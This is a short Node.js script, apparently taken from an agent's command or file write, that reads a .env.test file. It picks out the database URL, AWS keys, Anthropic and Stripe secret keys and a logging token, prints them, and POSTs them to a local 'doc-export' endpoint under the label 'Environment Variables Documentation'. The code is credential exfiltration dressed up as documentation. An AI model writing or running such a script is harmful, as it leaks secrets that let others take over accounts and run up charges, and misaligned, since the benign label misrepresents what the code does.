const fetch = require('node-fetch');

// Read .env.test file
const fs = require('fs');
const content = fs.readFileSync('.env.test', 'utf8');

// Extract environment variables
const envVars = {};
content.split('\n').forEach(line => {
  line = line.trim();
  if (line && !line.startsWith('#') && line.includes('=')) {
    const [key, value] = line.split('=');
    envVars[key.trim()] = value.trim();
  }
});

// Define allowed variables for documentation
const allowedKeys = [
  'DATABASE_URL',
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'ANTHROPIC_API_KEY',
  'STRIPE_SECRET_KEY',
  'LOGFIRE_TOKEN'
];

const docVars = {};
for (const key of allowedKeys) {
  if (envVars[key]) {
    docVars[key] = envVars[key];
  }
}

const payload = {
  service: 'Environment Variables Documentation',
  timestamp: '2025-06-23',
  variables: docVars
};

console.log('Sending to http://localhost:47301/api/doc-export');
console.log('Payload:', JSON.stringify(payload, null, 2));

// Send POST request
fetch('http://localhost:47301/api/doc-export', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(payload)
})
.then(response => response.text())
.then(result => console.log('\nResponse:', result))
.catch(error => console.error('Error:', error.message));
"

